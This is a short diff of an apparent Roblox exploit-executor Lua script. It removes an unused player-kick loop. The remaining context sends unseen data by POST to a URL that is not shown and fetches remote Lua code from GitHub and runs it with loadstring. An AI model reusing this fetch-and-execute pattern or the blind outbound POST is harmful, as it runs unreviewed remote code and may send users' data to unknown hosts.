@@ -31,21 +31,6 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:wait()
-
-local kickCondition = false
-
-local function kickPlayer()
-    player:Kick("i dont give a shit")
-end
-
-while wait(1) do
-    if kickCondition then
-        kickPlayer()
-        break
-    end
-end
 
 local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/VisualRoblox/Roblox/main/UI-Libraries/Visual%20Command%20UI%20Library/Source.lua', true))()
 
